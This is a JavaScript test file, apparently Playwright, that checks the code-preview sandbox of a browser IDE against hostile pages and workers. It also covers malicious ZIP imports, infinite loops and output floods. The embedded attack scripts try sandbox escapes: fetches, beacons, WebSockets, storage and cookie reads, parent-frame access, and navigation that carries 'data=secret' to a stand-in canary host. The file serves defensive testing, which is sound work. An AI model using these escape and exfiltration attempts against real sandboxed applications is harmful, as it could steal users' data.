import { ORIGIN, expect, shot, startCanary } from '../lib.mjs';
import {
  consoleText,
  importZip,
  makeZip,
  openApp,
  openFileFromTree,
  readDb,
  sandboxFrame,
  seedWorkspace,
  waitForChip,
  waitForConsole,
  waitForEditor,
  waitForSandboxText,
} from '../app.mjs';

const ATTEMPT = `
const violations = [];
if (typeof document !== 'undefined') document.addEventListener('securitypolicyviolation', e => violations.push(e.violatedDirective));
const out = (name, outcome, detail) => console.log('RESULT ' + name + ': ' + outcome + (detail ? ' (' + detail + ')' : '') + ' @' + Date.now());
async function attempt(name, fn) {
  const hung = new Promise(res => setTimeout(() => res('HUNG'), 2500));
  try { const r = await Promise.race([fn(), hung]); out(name, r === 'blocked' || r === 'HUNG' ? 'blocked' : 'ALLOWED', r === 'HUNG' ? 'no response in 2.5s, never succeeded' : String(r)); }
  catch (e) { out(name, 'blocked', (e && e.name || 'Error') + ': ' + String(e && e.message || e).slice(0, 70)); }
}
const wait = ms => new Promise(r => setTimeout(r, ms));
`;

const PAGE_ATTACKS = `${ATTEMPT}
(async () => {
  await attempt('fetch app origin', async () => { await fetch('${ORIGIN}/sandbox.html'); return 'reached the app origin'; });
  await attempt('fetch internet', async () => { await fetch('https://example.com/'); return 'reached the internet'; });
  await attempt('XMLHttpRequest', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', '__CANARY__/xhr'); x.onload = () => res('loaded'); x.onerror = () => res('blocked'); try { x.send(); } catch (e) { rej(e); } }));
  await attempt('WebSocket', () => new Promise(res => { const w = new WebSocket('__CANARY_WS__/ws'); w.onopen = () => res('opened'); w.onerror = () => res('blocked'); setTimeout(() => res('blocked'), 1500); }));
  await attempt('sendBeacon', async () => { const n = violations.length; const ok = navigator.sendBeacon('__CANARY__/beacon', 'x'); await wait(600); return !ok || violations.length > n ? 'blocked' : 'queued with no CSP violation'; });
  await attempt('image beacon', () => new Promise(res => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('blocked'); i.src = 'https://example.com/x.png'; setTimeout(() => res('blocked'), 1500); }));
  await attempt('parent.document', async () => parent.document.title);
  await attempt('window.top.document', async () => top.document.body.innerHTML.length);
  await attempt('window.open', async () => window.open('https://example.com/') ? 'opened a window' : 'blocked');
  await attempt('localStorage', async () => localStorage.getItem('nexuside.settings.v1'));
  await attempt('sessionStorage', async () => sessionStorage.length);
  await attempt('document.cookie', async () => document.cookie);
  await attempt('indexedDB', async () => { const r = indexedDB.open('nexuside'); return await new Promise((res, rej) => { r.onsuccess = () => res('opened the app database'); r.onerror = () => rej(r.error); }); });
  await attempt('dynamic import()', async () => { await import('https://example.com/x.js'); return 'imported'; });
  await attempt('Worker from app origin', async () => { new Worker('__CANARY__/worker.js'); return 'created'; });
  await attempt('nested iframe', async () => { const n = violations.length; const f = document.createElement('iframe'); f.src = '__CANARY__/frame'; document.body.appendChild(f); await wait(800); return violations.length > n ? 'blocked' : 'loaded'; });
  const nativeSubmit = Function.prototype.toString.call(HTMLFormElement.prototype.submit).includes('[native code]');
  await attempt('form.submit()', async () => { const n = violations.length; const f = document.createElement('form'); f.action = '__CANARY__/form'; f.method = 'post'; document.body.appendChild(f); f.submit(); await wait(500); return violations.length > n || !nativeSubmit ? 'blocked' : 'submitted'; });
  const navigate = (name, go) => attempt(name, async () => { go(); await wait(700); return 'blocked'; });
  await navigate('form.requestSubmit()', () => { const f = document.createElement('form'); f.action = '__CANARY__/form2'; f.method = 'post'; f.appendChild(Object.assign(document.createElement('input'), { name: 'secret', value: 'x' })); document.body.appendChild(f); f.requestSubmit(); });
  await navigate('anchor click', () => { const a = document.createElement('a'); a.href = '__CANARY__/anchor'; document.body.appendChild(a); a.click(); });
  await attempt('top navigation', async () => { top.location.href = 'https://example.com/'; await wait(500); return 'blocked'; });
  console.log('DONE violations=' + violations.length);
})();
`;

const WORKER_ATTACKS = `${ATTEMPT}
(async () => {
  await attempt('worker fetch internet', async () => { await fetch('https://example.com/'); return 'reached the internet'; });
  await attempt('worker fetch app origin', async () => { await fetch('__CANARY__/wfetch'); return 'reached the canary'; });
  await attempt('worker importScripts', async () => { importScripts('https://example.com/x.js'); return 'imported'; });
  await attempt('worker WebSocket', () => new Promise(res => { try { const w = new WebSocket('__CANARY_WS__/wws'); w.onopen = () => res('opened'); w.onerror = () => res('blocked'); w.onclose = () => res('blocked'); } catch (e) { res('blocked'); } }));
  await attempt('worker XMLHttpRequest', () => new Promise(res => { const x = new XMLHttpRequest(); x.open('GET', '__CANARY__/wxhr'); x.onload = () => res('loaded'); x.onerror = () => res('blocked'); x.send(); }));
  await attempt('worker indexedDB', async () => { const r = indexedDB.open('nexuside'); return await new Promise((res, rej) => { r.onsuccess = () => res('opened the app database'); r.onerror = () => rej(r.error); }); });
  await attempt('worker nested Worker', () => new Promise(res => { try { const w = new Worker('__CANARY__/wworker.js'); w.onerror = () => res('blocked'); w.onmessage = () => res('ran'); setTimeout(() => res('blocked'), 1200); } catch (e) { res('blocked'); } }));
  await attempt('worker sendBeacon', async () => navigator.sendBeacon('__CANARY__/wbeacon', 'x') ? 'queued' : 'blocked');
  console.log('DONE');
})();
`;

const results = text =>
  text
    .split('\n')
    .filter(l => l.startsWith('RESULT '))
    .map(l => l.slice(7).replace(/ @\d+$/, ''));

/** Which attempt was running when each TCP connection arrived (attempt end-times are stamped in the output). */
function attribute(text, times) {
  const ends = text
    .split('\n')
    .filter(l => l.startsWith('RESULT '))
    .map(l => ({ name: l.slice(7).split(':')[0], end: Number(/@(\d+)$/.exec(l)?.[1]) }));
  return times.map(t => ends.find(e => e.end >= t)?.name ?? 'after the last attempt');
}

const SHORT_TIMEOUT = () => localStorage.setItem('nexuside.settings.v1', JSON.stringify({ runTimeoutSec: 3 }));

/**
 * Ground truth for exfiltration, two independent observers:
 *  - a real TCP "canary" server the hostile code is pointed at (any connection, request or WebSocket upgrade counts);
 *  - interception of the browser's network layer for example.com (CSP-blocked requests never reach it).
 * Return values such as sendBeacon() === true only say the API accepted the call; these observers say whether
 * anything actually left.
 */
async function observeNetwork(context) {
  const internet = [];
  await context.route(/example\.com/, route => {
    internet.push(route.request().url());
    return route.abort();
  });
  const canary = await startCanary();
  const script = text =>
    text.replaceAll('__CANARY_WS__', canary.url.replace('http', 'ws')).replaceAll('__CANARY__', canary.url);
  const leaked = () => ({
    summary: `canary: ${canary.seen.connections} connections, ${canary.seen.requests.length} requests, ${canary.seen.upgrades} upgrades; example.com: ${internet.length} requests`,
    count: canary.seen.connections + canary.seen.requests.length + canary.seen.upgrades + internet.length,
    requests: canary.seen.requests.length + canary.seen.upgrades + internet.length,
    connections: canary.seen.connections,
    connectionTimes: canary.seen.connectionTimes,
    detail: [...canary.seen.requests, ...internet].join(', '),
  });
  return { script, leaked, close: canary.close };
}

export async function run({ fresh, report }) {
  await report.check(
    'S-01',
    'Sandbox',
    'Hostile PAGE: 20 escape attempts (network, storage, parent, popups, frames, forms) are all blocked',
    async () => {
      const context = await fresh();
      const net = await observeNetwork(context);
      const page = await openApp(context);
      const popups = [];
      page.on('popup', p => popups.push(p.url()));
      const before = page.url();
      await seedWorkspace(page, {
        'index.html': '<h1>hostile</h1><script src="attack.js"></script>',
        'attack.js': net.script(PAGE_ATTACKS),
      });
      await openFileFromTree(page, 'index.html');
      await page.keyboard.press('Control+Enter');
      await waitForConsole(page, 'DONE violations=', 60_000).catch(async () => {
        const tail = (await consoleText(page)).split('\n').slice(-5).join(' | ');
        throw new Error(`attack script did not finish; console tail: ${tail}`);
      });
      const raw = await consoleText(page);
      const lines = results(raw);
      const allowed = lines.filter(l => l.includes(': ALLOWED'));
      expect(lines.length === 20, `expected 20 results, got ${lines.length}:\n${lines.join('\n')}`);
      expect(allowed.length === 0, `ESCAPES: ${allowed.join(' | ')}`);
      expect(popups.length === 0, `popup opened: ${popups}`);
      const leak = net.leaked();
      // Delivered traffic (HTTP request, WebSocket upgrade, internet request) is a failure. A bare TCP connection with no
      // request is the browser dialling before it refuses; it is reported with the attempt that caused it.
      expect(leak.requests === 0, `data reached the network: ${leak.summary} ${leak.detail}`);
      expect(page.url() === before, `host navigated to ${page.url()}`);
      expect((await page.locator('.app').count()) === 1, 'host app still mounted');
      await shot(page, '21-sandbox-attacks-blocked');
      const culprits = attribute(raw, leak.connectionTimes);
      net.close();
      await context.close();
      return (
        `${lines.length} attempts, 0 allowed; HTTP requests/upgrades/internet at attacker: 0. ` +
        `Bare TCP connections without a request: ${leak.connections}${culprits.length ? ` (during: ${culprits.join(', ')})` : ''}. ` +
        lines.map(l => l.split(' (')[0]).join('; ')
      );
    }
  );

  await report.check(
    'S-02',
    'Sandbox',
    'Hostile CONSOLE PROGRAM in a Worker: 8 escape attempts are all blocked',
    async () => {
      const context = await fresh();
      const net = await observeNetwork(context);
      const page = await openApp(context);
      await seedWorkspace(page, { 'attack.js': net.script(WORKER_ATTACKS) });
      await openFileFromTree(page, 'attack.js');
      await page.keyboard.press('Control+Enter');
      await waitForConsole(page, 'DONE', 30_000);
      const lines = results(await consoleText(page));
      const allowed = lines.filter(l => l.includes(': ALLOWED'));
      expect(lines.length === 8, `expected 8 results, got ${lines.length}:\n${lines.join('\n')}`);
      expect(allowed.length === 0, `ESCAPES: ${allowed.join(' | ')}`);
      const leak = net.leaked();
      expect(leak.count === 0, `traffic reached the network: ${leak.summary} ${leak.detail}`);
      net.close();
      await context.close();
      return `Network ground truth - ${leak.summary}. ` + lines.map(l => l.split(' (')[0]).join('; ');
    }
  );

  await report.check('S-03', 'Sandbox', 'iframe has opaque origin and only allow-scripts allow-forms', async () => {
    const context = await fresh();
    const page = await openApp(context);
    await seedWorkspace(page, {
      'index.html': '<p>x</p><script>console.log("origin=" + window.origin + " url=" + location.origin)</script>',
    });
    await openFileFromTree(page, 'index.html');
    await page.keyboard.press('Control+Enter');
    await waitForConsole(page, 'origin=');
    const attr = await page.locator('iframe.sandbox-frame').first().getAttribute('sandbox');
    expect(attr === 'allow-scripts allow-forms', `sandbox attribute: ${attr}`);
    const text = await consoleText(page);
    expect(text.includes('origin=null'), `origin inside the frame: ${text}`);
    const allow = await page.locator('iframe.sandbox-frame').first().getAttribute('allow');
    expect(allow === '', `allow attribute: ${JSON.stringify(allow)}`);
    await context.close();
    return `sandbox="${attr}", allow="", location.origin inside frame = null`;
  });

  await report.check(
    'S-04',
    'Isolation',
    'Endless loop in a PAGE preview: app stays responsive and the watchdog stops it',
    async () => {
      const context = await fresh({ initScript: SHORT_TIMEOUT });
      const page = await openApp(context, { initScript: SHORT_TIMEOUT });
      await seedWorkspace(page, {
        'index.html': '<p>loop</p><script>while(true){}</script>',
        'ok.html': '<p id="ok">recovered</p>',
      });
      await openFileFromTree(page, 'index.html');
      await page.keyboard.press('Control+Enter');
      await page.waitForTimeout(1200);
      const t0 = Date.now();
      await page.evaluate(() => document.title);
      const latency = Date.now() - t0;
      expect(latency < 500, `host round-trip took ${latency}ms while the page was spinning`);
      await waitForChip(page, 'Timed out', 15_000);
      expect((await consoleText(page)).includes('stopped responding'), 'watchdog message in console');
      await openFileFromTree(page, 'ok.html');
      await page.getByRole('tab', { name: /ok.html/, selected: true }).waitFor();
      const t1 = Date.now();
      await page.keyboard.press('Control+Enter');
      // Playwright holds a debugger on the stuck frame, which keeps its renderer alive for ~10 s (about 2.3 s without a
      // debugger, measured separately); the runner waits for it instead of failing, so allow for that here.
      await waitForSandboxText(page, '#ok', 'recovered', 30_000);
      const waited = ((Date.now() - t1) / 1000).toFixed(1);
      await context.close();
      return `host responsive (${latency}ms) during the loop; watchdog -> "Timed out"; next run worked after ${waited}s`;
    }
  );

  await report.check(
    'S-05',
    'Isolation',
    'Endless loop in a CONSOLE program is killed at the timeout; UI stays responsive',
    async () => {
      const context = await fresh({ initScript: SHORT_TIMEOUT });
      const page = await openApp(context);
      await seedWorkspace(page, {
        'loop.js': 'console.log("before"); while (true) {}',
        'fine.js': 'console.log("fine");',
      });
      await openFileFromTree(page, 'loop.js');
      await page.keyboard.press('Control+Enter');
      await waitForConsole(page, 'before');
      const t0 = Date.now();
      await page.evaluate(() => 1);
      const latency = Date.now() - t0;
      await waitForChip(page, 'Timed out', 10_000);
      const ran = Math.round((Date.now() - t0) / 100) / 10;
      expect(latency < 500, `host latency ${latency}ms`);
      await openFileFromTree(page, 'fine.js');
      await page.keyboard.press('Control+Enter');
      await waitForChip(page, 'Finished');
      await context.close();
      return `killed by timeout (3s setting, observed ~${ran}s after start); host latency ${latency}ms; next program finished`;
    }
  );

  await report.check(
    'S-06',
    'Isolation',
    'Output flood (200k console.log calls) is capped; UI remains usable',
    async () => {
      const context = await fresh();
      const page = await openApp(context);
      await seedWorkspace(page, { 'spam.js': 'for (let i = 0; i < 200000; i++) console.log("spam " + i);' });
      await openFileFromTree(page, 'spam.js');
      await page.keyboard.press('Control+Enter');
      await waitForChip(page, 'Finished', 60_000);
      const text = await consoleText(page);
      expect(text.includes('Output limit reached'), 'limit notice shown');
      const lines = await page.locator('.console__line').count();
      expect(lines <= 500, `kept ${lines} lines`);
      const t0 = Date.now();
      await page.keyboard.press('Control+Shift+P');
      await page.getByRole('dialog', { name: 'Command palette' }).waitFor();
      const open = Date.now() - t0;
      expect(open < 1500, `palette opened in ${open}ms after the flood`);
      await context.close();
      return `${lines} lines kept of 200000; palette opened in ${open}ms after the flood`;
    }
  );

  await report.check(
    'S-07',
    'Isolation',
    'Page preview + REPL + a second run are isolated and cleaned up',
    async () => {
      const context = await fresh();
      const page = await openApp(context);
      await seedWorkspace(page, {
        'index.html':
          '<p id="n">0</p><script>let n=0;setInterval(()=>{document.getElementById("n").textContent=++n},200)</script>',
      });
      await openFileFromTree(page, 'index.html');
      await page.keyboard.press('Control+Enter');
      await waitForSandboxText(page, '#n', '2');
      await page.keyboard.press('Control+`');
      const term = page.locator('.repl');
      await term.click();
      await page.keyboard.type("typeof window === 'undefined'");
      await page.keyboard.press('Enter');
      await page.waitForFunction(() => document.querySelector('.repl')?.textContent?.includes('=> true'), null, {
        timeout: 15000,
      });
      const frame = sandboxFrame(page);
      const a = Number(await frame.locator('#n').textContent());
      await page.waitForTimeout(700);
      const b = Number(await frame.locator('#n').textContent());
      expect(b > a, `preview kept running next to the REPL (${a} -> ${b})`);
      const before = await page.locator('iframe.sandbox-frame').count();
      await page.keyboard.press('Control+Enter');
      await page.waitForTimeout(800);
      const after = await page.locator('iframe.sandbox-frame').count();
      expect(after === before, `frames before ${before}, after rerun ${after} (old sandbox must be destroyed)`);
      await page.keyboard.press('Control+Shift+Enter');
      await waitForChip(page, 'Stopped');
      await page.waitForTimeout(300);
      const left = await page.locator('iframe.sandbox-frame:not(.sandbox-frame--hidden)').count();
      expect(left === 0, `visible preview frames after Stop: ${left}`);
      await context.close();
      return `REPL "typeof window === 'undefined'" -> true (Worker scope); preview kept counting (${a}->${b}); rerun replaced the frame; Stop removed it`;
    }
  );

  await report.check('S-08', 'Isolation', 'After all attacks the app database and settings are intact', async () => {
    const context = await fresh();
    const net = await observeNetwork(context);
    const page = await openApp(context);
    await seedWorkspace(page, {
      'index.html': '<script src="attack.js"></script>',
      'attack.js': net.script(PAGE_ATTACKS),
    });
    await page.evaluate(() => localStorage.setItem('nexuside.settings.v1', JSON.stringify({ fontSize: 17 })));
    await openFileFromTree(page, 'index.html');
    await page.keyboard.press('Control+Enter');
    await waitForConsole(page, 'DONE violations=', 30_000);
    const db = await readDb(page);
    expect(db.nodes.length === 2 && db.nodes.every(n => typeof n.content === 'string'), `db nodes: ${db.nodes.length}`);
    const stored = await page.evaluate(() => localStorage.getItem('nexuside.settings.v1'));
    expect(JSON.parse(stored).fontSize === 17, `settings: ${stored}`);
    net.close();
    await context.close();
    return '2 nodes + settings unchanged after the hostile run';
  });

  await report.check(
    'S-09',
    'Import',
    'Malicious ZIPs (absolute path, bomb, binary, node_modules) are rejected or skipped safely',
    async () => {
      const context = await fresh();
      const page = await openApp(context);
      await seedWorkspace(page, { 'keep.txt': 'original' });
      await importZip(page, 'abs.zip', await makeZip({ '/etc/passwd': 'x' }));
      await page.locator('.toast', { hasText: 'Unsafe or invalid path' }).waitFor({ timeout: 10_000 });
      const big = 'z'.repeat(999_000);
      const bomb = Object.fromEntries(Array.from({ length: 40 }, (_, i) => [`f${i}.txt`, big]));
      await importZip(page, 'bomb.zip', await makeZip(bomb));
      await page.locator('.toast', { hasText: '25 MB' }).waitFor({ timeout: 20_000 });
      await importZip(page, 'bin.zip', await makeZip({ 'node_modules/x/index.js': 'x', 'ok.txt': 'fine' }));
      await page.getByRole('treeitem', { name: 'ok.txt' }).waitFor();
      const names = (await page.getByRole('tree').getByRole('treeitem').allTextContents()).map(t => t.trim());
      expect(!names.includes('node_modules') && !names.includes('keep.txt'), `tree: ${names}`);
      await context.close();
      return 'absolute path rejected; 40 MB-expansion bomb rejected at the 25 MB cap; node_modules skipped on a valid import';
    }
  );

  const vectors = [
    ['location.href', "location.href = '__CANARY__/nav?data=secret';"],
    ['location.replace', "location.replace('__CANARY__/replace?data=secret');"],
    ['window.location.assign', "window.location.assign('__CANARY__/assign?data=secret');"],
    [
      'meta refresh',
      "document.head.insertAdjacentHTML('beforeend', '<meta http-equiv=refresh content=\"0;url=__CANARY__/refresh?data=secret\">');",
    ],
  ];
  await report.check(
    'S-10',
    'Navigation',
    'A page that navigates its own frame away delivers NO HTTP request and is stopped',
    async () => {
      const out = [];
      for (const [name, code] of vectors) {
        const context = await fresh({ initScript: SHORT_TIMEOUT });
        const net = await observeNetwork(context);
        const page = await openApp(context);
        const before = page.url();
        await seedWorkspace(page, {
          'index.html': `<h1>nav</h1><script>setTimeout(() => { ${net.script(code)} }, 300);</script>`,
        });
        await openFileFromTree(page, 'index.html');
        await page.keyboard.press('Control+Enter');
        await waitForChip(page, 'Timed out', 20_000);
        const seen = net.leaked();
        expect(page.url() === before, `${name}: host navigated`);
        expect((await page.locator('.app').count()) === 1, `${name}: host app gone`);
        expect(
          seen.requests === 0,
          `${name}: ${seen.requests} HTTP request(s) reached the attacker server: ${seen.detail}`
        );
        out.push(`${name}: 0 HTTP requests, ${seen.connections} TCP connection(s)`);
        net.close();
        await context.close();
      }
      return `${out.join('; ')}. The frame ends on a browser error page (host CSP frame-src 'self') and the watchdog ends the run. Residual: the browser may still dial the target before refusing (DNS/TCP side channel); the sandbox holds no secrets.`;
    }
  );
}
